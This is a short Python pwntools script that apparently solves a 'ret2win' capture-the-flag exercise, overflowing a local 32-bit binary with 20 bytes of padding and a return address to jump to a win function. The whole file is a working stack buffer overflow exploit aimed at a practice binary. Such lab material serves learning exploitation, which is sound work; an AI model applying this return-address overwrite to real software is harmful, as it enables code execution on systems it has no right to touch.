from pwn import *

context.arch = 'i386'

ret2win_process = process('./ret2win')

print(ret2win_process.recvline())
print(ret2win_process.recvline())

payload = b''
payload += b'A' * 20
payload += p32(0x8049186)

ret2win_process.sendline(payload)

ret2win_process.interactive()
